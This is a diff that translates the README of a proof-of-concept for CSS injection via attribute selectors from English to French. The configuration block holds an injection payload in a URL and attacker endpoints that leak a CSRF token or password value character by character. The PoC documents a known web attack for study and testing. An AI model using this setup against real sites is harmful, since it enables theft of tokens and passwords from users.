@@ -1,50 +1,50 @@
-# PoC - CSS Injection : Attribute Selectors 
+# PoC - CSS Injection : Sélecteur d'attributs
 
 __Read this in other languages:__ [English](README.md), [Français](README.fr.md)
 
 ## Description
 
-PoC for exploiting a CSS injection using attribute selectors to retrieve the value of an attribute of an HTML element.
+PoC d'exploitation d'une injection CSS en utilisant les sélecteurs d'attributs afin de récupérer la valeur d'un attribut d'un élément HTML.
 
-## Prerequisites
+## Prérequis
 
-- The vulnerable site must be able to be iframed, see `X-Frame-Options` and `frame-ancestors` HTTP headers.
-- There are some limitations when the value to be retrieved starts with a number. The target value must then be surrounded by single or double quotes and exploitation may not be possible if these characters are filtered by the application.
+- Le site vulnérable doit pouvoir être iframé, voir entêtes HTTP `X-Frame-Options` et `frame-ancestors`.
+- Il existe certaines limites lorsque la valeur à récupérer commence par un chiffre. La valeur de sélection doit alors être entourée par de guillemets simples ou doubles et l'exploitation peut ne pas être possible dans le cas ou ces caractères sont filtrés par l'application.
 
 ## Configuration
 
-Before using the PoC, adapt the following values:
+Avant d'utiliser le PoC, configurer les valeurs suivantes :
 
 ```
 /* ==== CONFIG ==== */
-// Full URL of the vulnerable application
+// URL complète de l'application vulnérable
 const RURL = "http://192.168.56.101/css-injection/partie1/css-injection-element-hidden.php?color=red;}";  
 
-// URL of the attacker's machine to retrieve the already known characters
+// URL de la machine de l'attaquant permettant de connaitre les caractères déjà identifiés
 const LURL_KNOWNCHARS = "http://192.168.56.102/css-injection/partie1/poc/knownChars.php";
 
-// URL of the attacker's machine to indicate a new identified character
+// URL de la machine de l'attaquant permettant d'indiquer un nouveau caractère identifié
 const LURL_LEAKCHAR = "http://192.168.56.102/css-injection/partie1/poc/leak.php?char=";
 
-// Name of the targeted HTML element
+// Nom de l'élément HTML ciblé
 const HTML_ELEMENT_NAME = "input";
 
-// Name of the targeted HTML attribute
+// Nom de l'attribut HTML ciblé
 const HTML_ATTRIBUTE_NAME = "name";
 
-// NAME value of the targeted HTML attribute
+// Valeur NAME de l'attribut HTML ciblé
 const HTML_ATTRIBUTE_VALUE = "csrf-token";
 
-// True if the targeted field is of type "hidden" (use of CSS combinators ~*)
+// True si le champs ciblé est de type "hidden" (utilisation des combinateurs CSS ~*)
 const isHiddenTypeElement = true;
 
-// When the characters "'" and """ are filtered by the application it's not possible to retrieve a value starting with a number
+// Lorsque les caractères "'" et """ sont filtrés par l'application il n'est pas possible de récupérer une valeur commençant par un chiffre
 const isQuoteFiltered = true;
 ```
 
-## Usage
+## Utilisation
 
-### Retrieving a value from a password field
+### Récupération d'une valeur d'un champ de type password
 
 ```javascript
 const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
@@ -57,7 +57,7 @@ const isHiddenTypeElement = false;
 const isQuoteFiltered = false;
 ```
 
-### Retrieving a value from a hidden field
+### Récupération d'une valeur d'un champ de type hidden
 
 ```javascript
 const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
@@ -70,12 +70,12 @@ const isHiddenTypeElement = true;
 const isQuoteFiltered = false;
 ```
 
-## Demo
+## Démo
 
-### Retrieving a value from a password field
+### Récupération d'une valeur d'un champ de type password
 
 ![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/password.gif)
 
-### Retrieving a value from a hidden field
+### Récupération d'une valeur d'un champ de type hidden
 
 ![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/hidden.gif)
